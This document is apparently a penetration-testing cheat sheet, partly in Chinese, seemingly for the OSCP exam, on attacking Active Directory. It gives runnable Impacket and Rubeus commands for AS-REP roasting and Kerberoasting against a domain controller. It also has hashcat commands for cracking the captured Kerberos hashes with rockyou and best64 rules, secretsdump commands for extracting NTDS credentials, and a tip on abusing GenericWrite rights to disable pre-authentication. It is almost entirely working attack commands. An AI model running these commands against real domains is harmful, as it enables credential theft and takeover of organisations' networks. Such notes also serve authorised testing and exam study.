# AS-REP Roasting
如果对域内某用户拥有GenericWrite或GenericAll权限
可以
**我们还可以利用这些权限修改用户的用户账户控制值，使其不要求Kerberos预身份验证**。—— 精准AS-REP烘烤
## Impacket
```bash
impacket-GetNPUsers -dc-ip <Domain_Controller_IP> corp.com/pete
impacket-GetNPUsers -dc-ip <Domain_Controller_IP> 'oscp.exam/'
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asrep corp.com/pete
  ```
  ## Rubeus
```powershell
Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file> /nowrap
```
## Kerberoasting
## Impacket
```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete -hashes <ntlm>
```
>"KRB_AP_ERR_SKEW(时钟偏差太大)" ->
>校时:ntpdate 3 或rdate 4
>提示：KRB5CCNAME未配置；找不到CCache文件[[impacket-GetUserSPNs ccache Not found ...]]
## Rubeus
```powershell
Rubeus.exe kerberoast /outfile:<output_TGSs_file>
Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"SID-VALUE"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] 
```
# Crack With HashCat
```bash
hashcat --help | grep -i "Kerberos"
#  18200 | Kerberos 5, etype 23, AS-REP
#  13100 | Kerberos 5, etype 23, TGS-REP  -- Kerberoasting

sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
# Extract
```bash
impacket-secretsdump username@target-ip -dc-ip target-ip
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
